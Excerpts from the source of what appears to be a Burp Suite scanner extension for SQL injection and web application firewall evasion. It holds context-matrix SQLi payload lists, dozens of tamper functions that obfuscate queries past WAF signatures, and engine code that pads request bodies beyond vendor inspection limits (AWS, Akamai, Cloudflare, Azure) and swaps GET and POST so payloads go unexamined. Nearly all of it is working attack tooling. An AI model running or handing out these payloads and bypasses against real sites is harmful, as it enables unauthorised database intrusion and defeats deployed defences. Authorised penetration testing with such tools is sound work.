...
PAYLOADS = {
    ...
    "SQL Injection": [
        ...
        # ── Context-matrix: TRUE/FALSE pairs for every injection context ──────
        # Numeric (no quotes): WHERE id=INJECTION
        "AND 1=1-- -",
        "AND 1=2-- -",
        "AND 1=1--",
        "AND 1=2--",
        ...
        ")) AND 1=2-- -",
        ") OR 1=1-- -",
        # Single-quote string: WHERE name='INJECTION'
        "' AND 1=1-- -",
        "' AND 1=2-- -",
        "' AND 1=1--",
        "' AND 1=2--",
        ...
        "' OR 1=1--",
        "' OR 1=1#",
        # Paren+quote: WHERE name=('INJECTION')
        "') AND 1=1-- -",
        "') AND 1=2-- -",
        "') AND 1=1--",
        "') AND 1=1#",
        ...
        "') OR ('1'='1",
        "') OR ('1'='1'-- -",
        # Double-paren: WHERE name=(('INJECTION'))
        "')) AND 1=1-- -",
        "')) AND 1=2-- -",
        "')) AND 1=1--",
        "')) AND 1=1#",
        ...
        "')) OR (('1'='1",
        "')) AND (('1'='1",
        # String comparison without leading quote: closes value in =INJECTION context
        "AND '1'='1'-- -",
        "AND '1'='2'-- -",
        "AND '1'='1'--",
        "AND '1'='1'#",
        "OR '1'='1'-- -",
        "OR '1'='0'-- -",
        # String comparison with leading quote (closes the open string)
        "' AND '1'='1",
        "' AND '1'='2",
        "' AND '1'='1'-- -",
        "' AND '1'='2'-- -",
        ...
        "' OR '1'='1'-- -",
        "' OR '1'='0'-- -",
        # 's'='s' variant (evades '1'='1' signature matching in some WAFs)
        "AND 's'='s'-- -",
        "AND 's'='t'-- -",
        "AND 's'='s'--",
        "AND 's'='s'#",
        ...
        "') AND 's'='s'-- -",
        "')) AND 's'='s'-- -",
        # Double-quote context: WHERE name="INJECTION"
        "\" AND 1=1-- -",
        "\" AND 1=2-- -",
        "\" AND 1=1--",
        "\" OR 1=1-- -",
        ...
        "\")) AND 1=1-- -",
        "\" AND '1'='1'-- -",
        # Backtick context (MySQL): WHERE `col`=`INJECTION`
        "` AND 1=1-- -",
        "` AND 1=2-- -",
        "` OR 1=1-- -",
        # No-comment string closures (for queries without obvious comment termination)
        "' AND '1'='1' AND 'x'='x",
        "' AND '1'='2' AND 'x'='x",
        "' OR 'a'='a",
        "' AND 'a'='a",
...
def tamper_between(sql):
    # Only replace numeric literals in comparison contexts.
    # Using \w+ (old) would match function names like CONVERT, VERSION, etc.
    # and produce broken SQL like "1 BETWEEN CONVERT AND CONVERT(INT,(SELECT...))".
    # Using \d+ restricts to integer literals only, which is safe and correct.
    # Negative lookahead (?!\s*[,(]) prevents matching inside function argument lists.
    sql = re.sub(r'=\s*(-?\d+)\b(?!\s*[,(])', r' BETWEEN \1 AND \1', sql)
    sql = re.sub(r'>\s*(-?\d+)\b(?!\s*[,(])', r' NOT BETWEEN 0 AND \1', sql)
    return sql
...
# Module-level constant: contexts where a bare integer must NOT be replaced by Ne0.
# Two cases covered:
#   A) A SQL keyword immediately before the digit (ORDER BY N, LIMIT N, SLEEP(…), etc.)
#   B) The digit is inside a WAITFOR DELAY time-format string ('0:0:N').
#      Detected by finding DELAY followed by an unclosed single-quote in the
#      40-char before-window (i.e. DELAY '0:0: is the prefix before our digit).
_SCI_SKIP_CTX = re.compile(
    r'(?:'
        r'\b(?:ORDER\s+BY|GROUP\s+BY|LIMIT|OFFSET|TOP|SLEEP|WAITFOR|BENCHMARK|REPEAT|'
        r'CHAR|ASCII|ORD|RPAD|LPAD|MID|SUBSTR(?:ING)?|YEAR|MONTH|DAY|HOUR|MINUTE|SECOND)'
        r'\s*$'
    r"|"
        r"\bDELAY\s+'[^']*$"   # inside WAITFOR DELAY '0:0:5' time literal
    r')',
    re.IGNORECASE
)

def tamper_scientific(sql):
    # Replace integer literals with scientific-notation equivalents (1 -> 1e0).
    # Fix A: ORDER BY/GROUP BY not matched when _SKIP_CONTEXT ended at ORDER but
    #         not at BY — now _SCI_SKIP_CTX includes full "ORDER\s+BY" phrase.
    # Fix B: WAITFOR DELAY '0:0:5' time literals — _SCI_SKIP_CTX now contains a
    #         DELAY '... pattern that fires when the before-window ends inside the
    #         time string.  Quote counting was removed: it incorrectly treated the
    #         leading injection quote (' AND 1=1) as opening a string literal.
    # Fix C: Moved compiled regex to module level (_SCI_SKIP_CTX) to avoid
    #         recompilation on every call.
    # Fix D: Empty after_ch guard — `'' in ',)'` is True in Python (empty string is
    #         a substring of any string), so `after_ch and after_ch in "',)"` is
    #         needed to avoid skipping digits at end-of-string.
    def _repl(m):
        pos = m.start()
        end = m.end()
        before   = sql[max(0, pos - 50):pos]
        after_ch = sql[end:end + 1] if end < len(sql) else ''
        stripped_before = before.rstrip()
        # Skip function argument positions: digit follows ( or ,
        # Also skip digits immediately inside a SQL string literal: digit follows '
        # (e.g. the '1' in AND '1'='1 must not become '1e0' — string comparison
        # semantics break when the literal text changes).
        if stripped_before and stripped_before[-1] in "(',":
            return m.group(0)
        # Skip digit followed by comma/close-paren/quote (still in arg list,
        # or directly adjacent to a string literal prefix like 1' UNION ...).
        # NOTE: guard `after_ch and` prevents Python's `'' in ','` == True quirk
        # from firing when the digit is at the very end of the SQL string.
        if after_ch and after_ch in "',)":
            return m.group(0)
        # Skip ORDER BY N, LIMIT N, SLEEP(N), CHAR(N), WAITFOR ... etc.
        if _SCI_SKIP_CTX.search(before):
            return m.group(0)
        return m.group(0) + 'e0'
    return re.sub(r'\b\d+\b', _repl, sql)
...
# ─────────────────────────────────────────────────────────────────────────────
# SQLI_TAMPERS  — 49 battle-tested transforms, ordered by general effectiveness.
# Removed (16): charunicodeescape, overlongutf8, htmlencode, decentities,
#   hexentities, lowercase, equaltorlike, least, escapequotes, appendnullbyte,
#   sp_password, ord2ascii, commalessmid, hex2char, unionalltounion, execconcat.
# Reason: obsolete on modern parsers, produce invalid SQL, or fully covered by
# a sibling tamper that is already in the list.
# ─────────────────────────────────────────────────────────────────────────────
SQLI_TAMPERS = [
    # ── Whitespace substitution (space → something the WAF misses) ─────────
    ...
    ("bluecoat",                tamper_bluecoat,                "Keyword%09 -- Bluecoat proxy bypass",    "any"),
    ("luanginx",                tamper_luanginx,                "Newline before keywords (Lua-nginx)",    "any"),
    ("commentbeforeparentheses",tamper_commentbeforeparentheses,"/**/ before ( -- e.g. SLEEP/**/(5)",     "any"),
    # ── Encoding (URL / Unicode / percentage) ──────────────────────────────
    ("charencode",              tamper_charencode,              "URL-encode each character",              "any"),
    ("chardoubleencode",        tamper_chardoubleencode,        "Double URL-encode",                      "any"),
    ("charunicodeencode",       tamper_charunicodeencode,       "Unicode %uXXXX encoding of alphanums",   "any"),
    ("percentage",              tamper_percentage,              "%S%E%L%E%C%T -- classic ASP/IIS bypass", "mssql"),
    # ── Case & keyword obfuscation ─────────────────────────────────────────
    ("randomcase",              tamper_randomcase,              "sElEcT random casing of SQL keywords",   "any"),
    ("uppercase",               tamper_uppercase,               "UPPERCASE all SQL keywords",             "any"),
    ("randomcomments",          tamper_randomcomments,          "SE/**/LECT mid-keyword comment split",   "any"),
    # ── MySQL versioned-comment tricks ─────────────────────────────────────
    ("modsecurityversioned",    tamper_modsecurityversioned,    "/*!3XREMAINDER*/ versioned comment",     "mysql"),
    ("modsecurityzeroversioned",tamper_modsecurityzeroversioned,"/*!00000REMAINDER*/ zero-version",       "mysql"),
    ("versionedmorekeywords",   tamper_versionedmorekeywords,   "/*!KEYWORD*/ wrapping every keyword",    "mysql"),
    ("halfversionedmorekeywords",tamper_halfversionedmorekeywords,"/*!0KEYWORD prefix (no close)",        "mysql"),
    ("versiongatedcomment",     tamper_versiongatedcomment,     "SELECT -> /*!50000SELECT*/",             "mysql"),
    # ── Comparison-operator substitution ───────────────────────────────────
    ("between",                 tamper_between,                 "=N -> BETWEEN N AND N (integers only)",  "any"),
    ...
    ("apostrophemask",          tamper_apostrophemask,          "' -> %EF%BC%87 (fullwidth apostrophe)",  "any"),
    ("apostrophenullencode",    tamper_apostrophenullencode,    "' -> %00%27 null-byte prefix",           "any"),
    ("unmagicquotes",           tamper_unmagicquotes,           "' -> %BF%27 GBK multi-byte bypass",      "mysql"),
    ("nprefixquote",            tamper_nprefixquote,            "' -> N' Unicode string prefix",          "mssql,mysql"),
    ("dollarquoting",           tamper_dollarquoting,           "'str' -> $$str$$ dollar-quoting",        "pgsql"),
    # ── Function aliasing (evade function-name signatures) ─────────────────
    ("sleep2getlock",           tamper_sleep2getlock,           "SLEEP(N) -> GET_LOCK('x',N)",            "mysql"),
    ("substring2mid",           tamper_substring2mid,           "SUBSTRING -> MID (MySQL alias)",         "mysql"),
    ("concat2concatws",         tamper_concat2concatws,         "CONCAT -> CONCAT_WS(MID(CHAR(0),0,0),..)","mysql"),
    ("if2case",                 tamper_if2case,                 "IF(c,t,e) -> CASE WHEN c THEN t ELSE e", "any"),
    ("ifnull2casewhenisnull",   tamper_ifnull2casewhenisnull,   "IFNULL(a,b) -> CASE WHEN ISNULL(a)...",  "any"),
    # ── Schema / object-name obfuscation ───────────────────────────────────
    ("informationschemacomment",tamper_informationschemacomment,"information_schema/**/ trailing comment","mysql"),
    ("schemasplit",             tamper_schemasplit,             "db/**/./**/table schema-dot split",      "any"),
    ("binary",                  tamper_binary,                  "='val' -> =BINARY'val' collation bypass","mysql"),
    # ── UNION obfuscation ──────────────────────────────────────────────────
    ...
    ("scientific",              tamper_scientific,              "1 -> 1e0 (safe: skips func args & ORDER)","mysql"),
    # ── Clause rewriting ───────────────────────────────────────────────────
    ("commalesslimit",          tamper_commalesslimit,          "LIMIT M,N -> LIMIT N OFFSET M",          "any"),
    # ── Fullwidth & multi-byte Unicode ─────────────────────────────────────
    ("fullwidthunicode",        tamper_fullwidthunicode,        "SELECT -> fullwidth SELECT (ｓｅｌｅｃｔ)","any"),
    # ── JSON / special-function tricks ─────────────────────────────────────
...
class ScanEngine(object):
    # Body-padding junk sizes (bytes).  Tests are run in order — each size is
    # calibrated to exceed a different WAF vendor's inspection limit:
    #   AWS WAF / Cloud Armor:  8 KB  (default inspect limit: 8–16 KB)
    #   Akamai:                64 KB  (inspect limit: up to 128 KB)
    #   Cloudflare / Azure:   128 KB  (inspect limit: ~128 KB)
    # The largest value is also used as JUNK_SIZE_BYTES for single-tier tests.
    JUNK_TIERS = [
        (8   * 1024, "8KB",   "AWS/CloudArmor tier"),
        (64  * 1024, "64KB",  "Akamai tier"),
        (130 * 1024, "130KB", "Cloudflare/Azure tier"),
    ]
    JUNK_SIZE_BYTES = JUNK_TIERS[-1][0]   # 130 KB — single-tier default
    ...
    def _build_method_switched_request(self, payload):
        """Convert POST->GET or GET->POST, injecting payload into the first switched param.

        POST->GET  moves all body params (type 1) to a URL query string.
        GET->POST  moves all URL params  (type 0) into a form body.
        Returns a bytearray ready to pass to _send(), or None on failure.
        """
        try:
            try:
                from urllib import quote as _qs_quote
            except ImportError:
                from urllib.parse import quote as _qs_quote
            analyzed   = self._h.analyzeRequest(self._svc, bytes(self._base_req))
            headers    = list(analyzed.getHeaders())
            params     = list(analyzed.getParameters())
            if not headers:
                return None
            ...
            if len(parts) < 3:
                return None
            cur_method = parts[0].upper()
            cur_path   = parts[1]
            http_ver   = parts[2]
            # Encode payload safely for use in URL / form body
            try:
                _u = unicode
            except NameError:
                _u = str
            pl_str = payload if isinstance(payload, (_u, str)) else str(payload)
            def _enc(s):
                try:
                    return _qs_quote(s.encode('utf-8') if hasattr(s, 'encode') else str(s), safe='')
                except Exception:
                    return s
            if cur_method == 'POST':
                # ── POST → GET ──────────────────────────────────────────────
                body_params = [(p.getName(), p.getValue()) for p in params
                               if p.getType() == 1]  # type 1 = BODY
                if not body_params:
                    return None
                result_pairs = []
                injected = False
                for name, value in body_params:
                    if not injected:
                        result_pairs.append((_enc(name), _enc(pl_str)))
                        injected = True
                    else:
                        result_pairs.append((_enc(name), _enc(value)))
                qs = '&'.join('%s=%s' % (n, v) for n, v in result_pairs)
                base_path = cur_path.split('?')[0]
                new_path  = base_path + '?' + qs
                new_first = 'GET %s %s' % (new_path, http_ver)
                new_hdrs  = [new_first]
                for h in headers[1:]:
                    hl = h.lower()
                    if not hl.startswith('content-type:') and not hl.startswith('content-length:'):
                        new_hdrs.append(h)
                return bytearray(self._h.buildHttpMessage(new_hdrs, bytearray(b'')))
            else:
                # ── GET → POST ──────────────────────────────────────────────
                url_params = [(p.getName(), p.getValue()) for p in params
                              if p.getType() == 0]  # type 0 = URL
                if not url_params:
                    return None
                result_pairs = []
                injected = False
                for name, value in url_params:
                    if not injected:
                        ...
                        result_pairs.append((_enc(name), _enc(value)))
                body_str   = '&'.join('%s=%s' % (n, v) for n, v in result_pairs)
                body_bytes = bytearray(body_str.encode('utf-8'))
                base_path  = cur_path.split('?')[0]
                new_first  = 'POST %s %s' % (base_path, http_ver)
                new_hdrs   = [new_first]
                for h in headers[1:]:
                    hl = h.lower()
                    if not hl.startswith('content-type:') and not hl.startswith('content-length:'):
                        new_hdrs.append(h)
                new_hdrs.append('Content-Type: application/x-www-form-urlencoded')
                new_hdrs.append('Content-Length: %d' % len(body_bytes))
                return bytearray(self._h.buildHttpMessage(new_hdrs, body_bytes))
        except Exception as _ms_err:
            self._log('[method-switch] build failed: ' + str(_ms_err))
            return None

    # ── Content-type-aware body padding (nowafpls technique) ─────────────────
    # WAF vendors inspect only a limited slice of the request body before
    # passing the request through.  Documented limits (approximate):
    #   AWS WAF / Cloud Armor  :   8 KB  (default)  – 64 KB (max)
    #   Akamai Kona            :   8 KB  (default)  – 128 KB (max)
    #   Cloudflare WAF         : 128 KB
    #   Azure Front Door WAF   : 128 KB
    # By inflating the request body to exceed those limits and placing the
    # malicious payload *after* the padding, the payload reaches the backend
    # without being inspected.
    #
    # Format-awareness (mirrors the nowafpls Burp extension behaviour):
    #   application/json                  →  ,"wafbypass":"<junk>"
    #   application/xml  / text/xml       →  <!-- <junk> -->
    #   application/x-www-form-urlencoded →  &wafbypass=<junk>
    #   multipart/form-data               →  extra part  name="wafbypass"
    #   everything else / GET (no body)   →  &wafbypass=<junk>  appended
    def _make_padded_request(self, raw_req, pad_size):
        # type: (bytes, int) -> bytes
        """Return a copy of raw_req with <pad_size> bytes of innocuous filler
        injected in a format-appropriate way so the total body length exceeds
        <pad_size>, pushing malicious content beyond the WAF's inspect window."""
        try:
            analyzed  = self._h.analyzeRequest(self._svc, raw_req)
            headers   = list(analyzed.getHeaders())
            body_off  = analyzed.getBodyOffset()
            body_raw  = raw_req[body_off:]
            ...
            junk_chars = "W" * pad_size

            if "application/json" in ct:
                # Inject as an extra JSON key at the very start of the object
                # so the padding comes BEFORE the real payload in the body.
                body_str = body_raw.decode("utf-8", errors="replace").strip()
                if body_str.startswith("{"):
                    # Insert padding key at start: {"wafbypass":"WWW...", <orig>
                    padded_body = ('{"wafbypass":"%s",' % junk_chars) + body_str[1:]
                else:
                    padded_body = body_str + ('&wafbypass=%s' % junk_chars)
                new_body = padded_body.encode("utf-8")

            elif "xml" in ct:
                # Insert XML comment at the beginning of the body
                body_str = body_raw.decode("utf-8", errors="replace")
                comment  = "<!-- %s -->" % junk_chars
                new_body = (comment + body_str).encode("utf-8")

            elif "multipart/form-data" in ct:
                # Insert an extra "wafbypass" part AS THE VERY FIRST PART so the
                # padding occupies the WAF's inspection window before the real fields.
                boundary = ""
                for _mp in ct.split(";"):
                    _mp = _mp.strip()
                    if _mp.startswith("boundary="):
                        boundary = _mp[len("boundary="):].strip('"')
                        break
                if boundary:
                    opening = ("--" + boundary + "\r\n").encode("utf-8")
                    idx_open = body_raw.find(opening)
                    if idx_open >= 0:
                        after_open = idx_open + len(opening)
                        # Junk part appears after the opening boundary line,
                        # pushing all real parts (and their payloads) beyond it.
                        extra_part = (
                            "Content-Disposition: form-data; name=\"wafbypass\"\r\n\r\n"
                            "%(j)s\r\n--%(b)s\r\n"
                        ) % {"b": boundary, "j": junk_chars}
                        new_body = (body_raw[:after_open]
                                    + extra_part.encode("utf-8")
                                    + body_raw[after_open:])
                    else:
                        # Opening boundary not found; fall back to appending
                        new_body = body_raw + ("&wafbypass=%s" % junk_chars).encode("utf-8")
                else:
                    new_body = body_raw + ("&wafbypass=%s" % junk_chars).encode("utf-8")

            else:
                # URL-encoded form or no body: prepend wafbypass=<junk> BEFORE the
                # real parameters so the malicious payload lands past the WAF window.
                if body_raw.strip():
                    new_body = ("wafbypass=%s&" % junk_chars).encode("utf-8") + body_raw
                else:
                    new_body = ("wafbypass=%s" % junk_chars).encode("utf-8")
            ...
            # Add Content-Type if missing (GET → POST needs it)
            has_ct = any(h.lower().startswith("content-type:") for h in new_headers)
            if not has_ct and new_body.strip():
                new_headers.append("Content-Type: application/x-www-form-urlencoded")
                # rewrite Content-Length now that it's known
                new_headers = [
                    ("Content-Length: %d" % len(new_body)
                     if h.lower().startswith("content-length:") else h)
                    for h in new_headers
                ]
            return bytes(self._h.buildHttpMessage(new_headers, new_body))
        except Exception as _pe:
            self._log("[pad_request] error: " + str(_pe))
            # Fallback: return the original request unchanged rather than
            # appending bytes to the raw HTTP message (which would corrupt it
            # by placing data after the end of the serialized message body).
            return raw_req
    ...
    def _build_request(self, payload,
                       ...
                       chunked_body=False,
                       switch_method=False):
        # Method-switch bypass: rebuild as GET<->POST and return immediately.
        # All other modifiers (encoding, junk, etc.) are skipped because the
        # method switch alone is the evasion primitive; they can be layered later.
        if switch_method:
            switched = self._build_method_switched_request(payload)
            if switched is not None:
                return switched
            # Fall through to normal build if switch fails (shouldn't happen after
            # bypass phase confirmed it works, but be defensive).
        ...
        if self._bounds:
            ...
            if not injected:
                modified = base
        if add_junk:
            modified = bytearray(self._make_padded_request(bytes(modified), self.JUNK_SIZE_BYTES))
    ...
    def _bypass_confidence(self, status, body):
        if self._blocked_baseline is None:
            # No WAF block-baseline was ever established, so we cannot
            # compare the current response against a known block page.
            # Return Tentative (not Firm/Certain) to avoid over-claiming
            # a bypass when there was nothing to bypass in the first place.
            return "Tentative"
    ...
    def _is_vuln(self, status, body):
        ...
        if status not in (200, 201, 301, 302, 500):
            return False
        # Anti-FP: fetch the clean-baseline snippet so we can skip patterns that
        # were already present in the page BEFORE injection.  Without this, broad
        # patterns like r"onclick\s*=" or r"alert\s*\(" fire on pages that
        # naturally contain JavaScript event handlers or inline scripts.
        baseline_snip = ""
        if self._clean_baseline:
            baseline_snip = self._clean_baseline.get("snippet", "")
        for pat in SUCCESS_PATTERNS.get(self._vtype, []):
            if re.search(pat, body, re.IGNORECASE):
                # Verify the matched content is NOT already present in the
                # clean (pre-injection) baseline response snippet.
                if not baseline_snip or not re.search(pat, baseline_snip, re.IGNORECASE):
                    return True
        return False
    ...
    def _phase_bypass(self, probe):
        ...
        # [2-D] Multi-tier body-size padding (nowafpls technique).
        # Tests each vendor threshold in ascending order — stops at first bypass.
        # Padding is format-aware: JSON / XML / multipart / URL-encoded bodies
        # each receive the filler in a syntactically correct position so the
        # backend can still process the request.
        #
        # Vendor limits (approx, from public docs):
        #   AWS WAF / Cloud Armor :   8 KB
        #   Akamai                :  64 KB
        #   Cloudflare / Azure    : 128 KB
        self._log("[2-D] Multi-tier body-size padding (WAF inspection-limit bypass)...")
        for _pad_bytes, _pad_label, _pad_vendor in self.JUNK_TIERS:
            if self._bypass:
                break
            self._log("[2-D] Trying %s padding (%s)..." % (_pad_label, _pad_vendor))
            try:
                _pad_raw = self._build_request(probe)
                _pad_req = bytearray(self._make_padded_request(bytes(_pad_raw), _pad_bytes))
                _pad_st, _pad_body = self._send(_pad_req)
                _pad_oc = self._outcome(_pad_st, _pad_body)
                self._report("[Bypass] Body-padding-%s" % _pad_label,
                             probe, _pad_st, _pad_body, _pad_oc)
                if not self._is_blocked(_pad_st, _pad_body):
                    self._log("[+] Body-size bypass WORKED at %s (%s)!" % (_pad_label, _pad_vendor))
                    self._bypass = {
                        "type": "junk",
                        "name": "body-padding-%s" % _pad_label,
                        "pad_bytes": _pad_bytes,
                        "pad_vendor": _pad_vendor,
                    }
            except Exception as _pad_err:
                self._log("[2-D] Padding error at %s: %s" % (_pad_label, str(_pad_err)))
        ...
        if not self._bypass:
            ...
            for _nb_probe, _nblabel in _nb_variants:
                ...
                try:
                    ...
                    pass
        if not self._bypass:
            self._log("[2-X] HTTP Method Switch (GET<->POST conversion)...")
            try:
                _ms_req = self._build_method_switched_request(probe)
                if _ms_req is not None:
                    _ms_status, _ms_body = self._send(_ms_req)
                    _ms_oc  = self._outcome(_ms_status, _ms_body)
                    _ms_dir = "POST->GET" if _is_post_request(self._base_req) else "GET->POST"
                    self._report("[Bypass] Method-Switch: %s" % _ms_dir,
                                 probe, _ms_status, _ms_body, _ms_oc)
                    if not self._is_blocked(_ms_status, _ms_body):
                        self._log("[+] Method-switch bypass WORKED: %s" % _ms_dir)
                        self._bypass = {
                            "type": "method_switch",
                            "name": "method-switch-" + _ms_dir,
                            "direction": _ms_dir,
                        }
                        # Now verify vulnerability with the switched method + probe
                        if not self._is_blocked(_ms_status, _ms_body) and self._vtype == "SQL Injection":
                            self._log("[2-X] Probing SQLi through switched method...")
                            for _ms_pl in [
                                "' AND 1=1-- -", "' AND 1=2-- -",
                                "AND 1=1-- -",   "AND 1=2-- -",
                                "') AND 1=1-- -","')) AND 1=1-- -",
                            ]:
                                _ms_pl_req = self._build_request(_ms_pl, switch_method=True)
                                _ms_pl_st, _ms_pl_body = self._send(_ms_pl_req)
                                _ms_pl_oc = self._outcome(_ms_pl_st, _ms_pl_body)
                                self._report("[2-X SQLi]", _ms_pl, _ms_pl_st, _ms_pl_body, _ms_pl_oc)
                                if _ms_pl_oc == "VULN!":
                                    self._log("[2-X] SQLi confirmed via method switch: " + _ms_pl)
                                    break
                else:
                    self._log("[2-X] No accessible params for method switch.")
            except Exception as _ms_ex:
                self._log("[2-X] Method switch skipped: " + str(_ms_ex))
        if not self._bypass:
            # [2-Y] Multi-tier padding + probe (format-aware, nowafpls technique).
            # Re-runs only if 2-D (general bypass probe) didn't find a hit.
            # Places the actual attack probe AFTER the padding so it arrives past
            # the WAF's inspect window.
            self._log("[2-Y] Multi-tier padding + probe (nowafpls technique)...")
            for _py_bytes, _py_label, _py_vendor in self.JUNK_TIERS:
                if self._bypass:
                    break
                try:
                    self._log("[2-Y] Testing %s (%s)..." % (_py_label, _py_vendor))
                    _py_base = self._build_request(probe)
                    _py_req  = bytearray(self._make_padded_request(bytes(_py_base), _py_bytes))
                    _py_st, _py_body = self._send(_py_req)
                    _py_oc = self._outcome(_py_st, _py_body)
                    self._report("[Bypass] padding+probe-%s" % _py_label,
                                 probe, _py_st, _py_body, _py_oc)
                    if not self._is_blocked(_py_st, _py_body):
                        self._log("[+] Padding bypass WORKED at %s (%s)!" % (_py_label, _py_vendor))
                        self._bypass = {
                            "type": "junk",
                            "name": "body-padding-%s" % _py_label,
                            "pad_bytes": _py_bytes,
                            "pad_vendor": _py_vendor,
                        }
                except Exception as _py_ex:
                    self._log("[2-Y] %s skipped: %s" % (_py_label, str(_py_ex)))
        if self._bypass:
    ...
    def _apply_bypass(self, payload, kwargs):
        ...
        elif btype == "method_switch":
            # Signal _build_request to perform GET<->POST conversion.
            # The payload itself is unchanged; the request restructuring handles evasion.
            kwargs["switch_method"] = True
        return payload, kwargs
